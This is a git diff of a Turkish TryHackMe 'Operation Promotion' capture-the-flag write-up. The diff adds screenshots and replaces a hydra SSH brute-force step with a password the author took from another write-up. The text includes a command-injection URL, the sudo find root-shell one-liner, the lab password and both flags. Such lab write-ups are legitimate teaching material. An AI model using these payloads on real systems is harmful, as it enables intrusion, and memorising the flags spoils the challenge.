@@ -63,6 +63,8 @@ Yani SMB tarafı şu an için bir çıkmaz sokaktı — içeride kullanılabilir
 
 ## Web Uygulaması - Admin Paneline Erişim
 
+<img width="1916" height="525" alt="admindizini" src="https://github.com/user-attachments/assets/c7e7a311-230a-4c8d-843a-c26c2da6c050" />
+
 `robots.txt` beni `/admin/` dizinine yönlendirmişti. Oraya gittiğimde bir login sayfasıyla karşılaştım. Elimde herhangi bir kullanıcı adı ya da parola olmadığı için ilk aklıma gelen klasik **SQL Injection ile auth bypass** denemek oldu.
 
 Kullanıcı adı alanına şunu girdim:
@@ -107,6 +109,8 @@ Sayfanın adı ve davranışı bana "muhtemelen arka planda bir `ping` komutu ç
 ```
 http://10.114.167.149/admin/sysmaint-checks/ping.php?host=10.0.0.0;cat%20ping.php
 ```
+
+<img width="749" height="462" alt="pingphp" src="https://github.com/user-attachments/assets/0ecaa16a-8cc6-44cc-93d8-37660e39e487" />
 
 Bu istek başarılı oldu ve `ping.php` kaynak kodunu görebildim. Kod, `host` parametresini URL'den alıp **hiçbir escape/sanitize işlemi yapmadan** doğrudan bir shell komutunun içine yerleştiriyordu. Yani klasik, ders kitabı örneği bir **OS Command Injection** açığıyla karşı karşıyaydım.
 
@@ -159,16 +163,18 @@ Elimde bir kullanıcı adı (`jford`) ve bir bcrypt hash'i vardı. Hash'i `john`
 ## Brute Force - SSH
 
 Elimde `jford` kullanıcı adı vardı ama parolayı bcrypt hash'inden çözemedim. Bu yüzden doğrudan SSH servisine karşı brute force denemesi yaptım:
+Ama yine de bir şeyler bulamadım ve başka birinin yazdığı writeup dan baktım.
+Şifre anasayfadaki Spring 2026 yazısından türetilerek bulunması gerekiyormuş :D
+Tamamen saçmalık xD
 
-```bash
-hydra -l jford -P /usr/share/wordlists/rockyou.txt ssh://10.114.167.149
+```
+Password : spring2026! 
 ```
 
-`rockyou.txt` ile deneme sonunda `jford` kullanıcısına ait geçerli parolayı buldum.
+```
+flag: THM{bdbee0a91ebcb0b0fafde931223efe09}
+```
 
-*(Ekran görüntüsü buraya: `screenshots/07-hydra-bruteforce.png`)*
-
----
 
 ## SSH ile Giriş ve User Flag
 
@@ -183,6 +189,7 @@ Giriş başarılı oldu ve ilk flag'i ele geçirdim:
 ```
 flag: THM{bdbee0a91ebcb0b0fafde931223efe09}
 ```
+<img width="354" height="81" alt="flag" src="https://github.com/user-attachments/assets/9ff329dd-8732-4b8b-b39b-a3a7b6141c4c" />
 
 ---
 
@@ -193,12 +200,7 @@ Sistemde yetkilerimi kontrol etmek için klasik `sudo -l` komutunu çalıştırd
 ```bash
 sudo -l
 ```
-
-Çıktıda şunu gördüm:
-
-```
-(root) NOPASSWD: /usr/bin/find
-```
+<img width="1045" height="99" alt="sudol" src="https://github.com/user-attachments/assets/4357a5a0-6e07-4f06-8eaa-99c3bd66bdcb" />
 
 `find` komutunun şifresiz olarak root yetkisiyle çalıştırılabilmesi, çok bilinen ve sıkça karşılaşılan bir **privilege escalation** açığıdır. `find`'ın `-exec` parametresi ile keyfi komut çalıştırabildiği için doğrudan root shell almak mümkün:
 
@@ -207,8 +209,6 @@ sudo find . -exec /bin/sh \; -quit
 ```
 
 Bu komutla root yetkisine yükseldim.
-
-*(Ekran görüntüsü buraya: `screenshots/08-sudo-find-privesc.png`)*
 
 ### Root Flag
 
@@ -219,23 +219,4 @@ cat /root/flag.txt
 ```
 THM{d999a1f6319a9c5b48c067dfab314ba2}
 ```
-
----
-
-## Özet
-
-| Aşama | Kullanılan Teknik |
-|---|---|
-| Recon | Nmap full port scan, ffuf dizin taraması |
-| SMB | Guest erişimiyle share keşfi |
-| İlk Erişim | SQL Injection ile admin panel auth bypass |
-| Bilgi Sızıntısı | IDOR (kullanıcı ID enumerasyonu) |
-| Web Shell | Command Injection (`ping.php`) |
-| Kimlik Bilgisi | Config dosyasından kullanıcı adı, rockyou ile SSH brute force |
-| Privilege Escalation | `sudo` ile şifresiz çalıştırılabilen `find` komutu |
-
-Operation Promotion, tek bir büyük açık yerine birbirine zincirlenen küçük zafiyetlerin (auth bypass → IDOR → command injection → brute force → sudo misconfig) nasıl bir araya gelip tam sistem ele geçirmeye dönüştüğünü gösteren güzel bir örnekti.
-
----
-
-*Bu writeup TryHackMe Operation Promotion odası için hazırlanmıştır.*
+<img width="660" height="181" alt="flag2" src="https://github.com/user-attachments/assets/8ff806e1-2390-434f-9181-1db567c74ba9" />
